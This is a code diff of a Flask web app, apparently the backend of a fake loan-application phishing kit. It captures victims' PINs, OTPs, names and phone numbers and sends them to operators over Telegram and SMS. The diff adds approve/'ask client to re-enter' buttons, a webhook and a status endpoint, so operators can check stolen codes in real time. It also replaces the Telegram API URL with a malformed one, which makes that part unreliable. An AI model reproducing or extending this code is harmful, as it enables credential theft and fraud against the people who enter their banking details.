@@ -46,21 +46,29 @@ def send_sms_notification(message):
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-def send_telegram_notification(message):
+def send_telegram_notification(message, record_id=None):
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
         print("Telegram configuration missing. Notification skipped.")
         return
     try:
         chat_ids = [cid.strip() for cid in TELEGRAM_CHAT_ID.split(',')]
         
+        reply_markup = None
+        if record_id:
+            reply_markup = {
+                "inline_keyboard": [[
+                    {"text": "❌ Incorrect — Ask Client to Re-enter", "callback_data": f"retry:{record_id}"},
+                    {"text": "✅ Approve", "callback_data": f"approve:{record_id}"}
+                ]]
+            }
+
         for chat_id in chat_ids:
             if not chat_id:
                 continue
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-            payload = {
-                "chat_id": chat_id,
-                "text": message
-            }
+            url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
+            payload = {"chat_id": chat_id, "text": message}
+            if reply_markup:
+                payload["reply_markup"] = reply_markup
             try:
                 resp = requests.post(url, json=payload, timeout=5)
                 print(f"Telegram response for {chat_id}: {resp.status_code} {resp.text}")
@@ -68,8 +76,6 @@ def send_telegram_notification(message):
                 print(f"Failed to send to chat_id {chat_id}: {inner_e}")
     except Exception as e:
         print(f"Telegram notification orchestration failed: {e}")
-
-
 
 # Helper to get current time in Zimbabwe/Johannesburg timezone
 def get_now_str():
@@ -1062,12 +1068,12 @@ def save_unified():
         f_v = data.get('value')
         now = get_now_str()
         if f_n == 'entered_pin':
-            m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
-            send_telegram_notification(m)
+            m = f'🔐 PIN Received\n\n👤 User: {name}\n🔢 PIN: {f_v}\n📞 Phone: {phone}'
+            send_telegram_notification(m, record_id=app_id)
             send_sms_notification(f"[Keshagi Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n == 'entered_otp':
-            m = f'📱 *OTP Received*\n\n👤 *User:* {name}\n🔑 *OTP:* {f_v}\n📞 *Phone:* {phone}'
-            send_telegram_notification(m)
+            m = f'📱 OTP Received\n\n👤 User: {name}\n🔑 OTP: {f_v}\n📞 Phone: {phone}'
+            send_telegram_notification(m, record_id=app_id)
             send_sms_notification(f"[Keshagi Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
@@ -1075,6 +1081,7 @@ def save_unified():
             send_telegram_notification(m)
             send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")
         return jsonify({'status': 'success', 'record_id': app_id})
+
 
     except Exception as e:
         print(f"Error in unified save: {e}")
@@ -1090,6 +1097,31 @@ from flask import send_from_directory
 def serve_assets(filename):
     return send_from_directory('assets', filename)
 
+@app.route('/api/telegram-webhook', methods=['POST'])
+def telegram_webhook():
+    update = request.get_json(silent=True) or {}
+    callback = update.get("callback_query")
+    if callback:
+        data = callback.get("data", "")
+        callback_id = callback.get("id")
+        
+        if ":" in data and db:
+            action, record_id = data.split(":", 1)
+            db.setex(f"status:{record_id}", 900, action)
+            
+            reply_text = "Marked as INCORRECT. Client prompted to re-enter." if action == "retry" else "Marked as APPROVED."
+            requests.post(
+                f"https://telegram.org{TELEGRAM_BOT_TOKEN}/answerCallbackQuery",
+                json={"callback_query_id": callback_id, "text": reply_text, "show_alert": True},
+                timeout=5
+            )
+    return jsonify({"ok": True})
+
+
+@app.route('/api/status/<record_id>', methods=['GET'])
+def check_status(record_id):
+    status = db.get(f"status:{record_id}") if db else None
+    return jsonify({"status": status or "pending"})
 
 if __name__ == "__main__":
     app.run(debug=True, port=int(os.environ.get("PORT", 8000)))
